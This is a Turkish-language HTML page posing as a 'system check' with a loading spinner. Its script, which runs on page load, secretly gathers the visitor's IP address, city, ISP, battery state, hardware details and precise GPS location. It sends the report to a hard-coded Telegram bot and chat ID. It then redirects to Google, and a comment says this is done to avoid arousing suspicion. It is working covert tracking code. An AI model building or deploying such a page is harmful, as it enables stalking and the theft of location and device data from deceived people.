<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Kontrolü</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; font-size: 14px; color: #888; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Cihaz uyumluluğu kontrol ediliyor, lütfen bekleyin...</p>

    <script>
        // --- SENİN BİLGİLERİN ---
        const botToken = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
        const chatId = "5802794454";

        async function startTracking() {
            let report = "🚀 **GELİŞMİŞ CİHAZ RAPORU** 🚀\n\n";

            // 1. IP ve İnternet Bilgileri
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                report += `🌐 **Ağ Bilgileri:**\n`;
                report += `• IP: \`${ipData.ip}\`\n`;
                report += `• Şehir: ${ipData.city} / ${ipData.region}\n`;
                report += `• Sağlayıcı: ${ipData.org}\n\n`;
            } catch (e) { report += "❌ IP bilgileri alınamadı.\n\n"; }

            // 2. Batarya Bilgisi
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    report += `🔋 **Batarya Durumu:**\n`;
                    report += `• Seviye: %${Math.round(battery.level * 100)}\n`;
                    report += `• Şarjda mı?: ${battery.charging ? "Evet ⚡" : "Hayır 🔋"}\n\n`;
                }
            } catch (e) { }

            // 3. Donanım Özellikleri
            report += `📱 **Donanım:**\n`;
            report += `• Platform: ${navigator.platform}\n`;
            report += `• Çekirdek: ${navigator.hardwareConcurrency || "Bilinmiyor"}\n`;
            report += `• Ekran: ${window.screen.width}x${window.screen.height}\n\n`;

            // 4. GPS Konumu (İzinli)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        report += `📍 **GPS KONUMU (TAM):**\n`;
                        report += `🔗 [Google Haritalarda Gör](${mapsLink})\n`;
                        report += `🎯 Hassasiyet: ${Math.round(pos.coords.accuracy)} metre`;
                        sendToTelegram(report);
                    },
                    (err) => {
                        report += `⚠️ **GPS:** Kullanıcı izin vermedi.`;
                        sendToTelegram(report);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                sendToTelegram(report + "❌ GPS bu cihazda desteklenmiyor.");
            }
        }

        function sendToTelegram(text) {
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
            .then(() => {
                // Bilgi gittikten sonra şüphe çekmemek için Google'a yönlendir
                setTimeout(() => {
                    window.location.href = "https://www.google.com";
                }, 1000);
            });
        }

        window.onload = startTracking;
    </script>
</body>
</html>
